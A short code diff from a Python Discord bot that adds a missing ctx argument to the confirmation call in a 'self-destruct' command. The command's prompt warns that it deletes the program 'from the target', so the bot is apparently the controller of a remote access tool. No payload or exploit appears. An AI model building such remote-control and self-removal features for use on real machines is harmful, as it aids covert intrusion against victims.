@@ -280,7 +280,7 @@ async def destruct():
 
 @bot.command(name="self-destruct")
 async def destruct_command(ctx):
-    confirm = confirm_action(action_description="**Are you sure you want to self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
+    confirm = confirm_action(ctx, action_description="**Are you sure you want to self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
 
     if confirm:
         embed = embed_data(title="Self-destruct", description="Self-destruction started", color=discord.Color.red())
